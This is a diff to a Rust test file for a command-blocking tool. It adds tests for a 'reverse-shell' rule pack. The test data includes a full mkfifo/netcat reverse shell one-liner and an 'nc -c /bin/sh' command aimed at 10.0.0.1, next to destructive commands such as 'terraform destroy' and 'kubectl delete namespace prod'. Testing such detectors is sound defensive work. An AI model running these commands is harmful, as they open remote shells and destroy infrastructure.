@@ -114,6 +114,15 @@ fn ml_pipeline_pack_zero_fp_zero_fn() {
 }
 
 #[test]
+fn reverse_shell_pack_zero_fp_zero_fn() {
+    assert_community_pack(
+        "reverse-shell",
+        include_str!("corpus/benign_reverse-shell.txt"),
+        include_str!("corpus/dangerous_reverse-shell.txt"),
+    );
+}
+
+#[test]
 fn shipped_example_packs_load_and_fire_through_evaluate() {
     // One representative dangerous command per shipped pack must Block when
     // that pack is enabled — proving the loader → gate wiring end to end.
@@ -122,6 +131,10 @@ fn shipped_example_packs_load_and_fire_through_evaluate() {
         ("iac-terraform", "terraform destroy -auto-approve"),
         ("k8s-helm", "kubectl delete namespace prod"),
         ("ml-pipeline", "huggingface-cli delete my-org/model"),
+        (
+            "reverse-shell",
+            "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -u 10.0.0.1 22 >/tmp/f",
+        ),
     ];
     for (pack, cmd) in cases {
         let cfg = cfg_with(&[pack], &dir);
@@ -146,6 +159,7 @@ fn community_packs_off_by_default_allow_pack_targets() {
         "kubectl delete namespace prod",
         "helm uninstall api",
         "huggingface-cli delete my-org/model",
+        "nc -c /bin/sh 10.0.0.1 4444",
     ] {
         assert_eq!(
             evaluate(cmd, &cfg).tier,
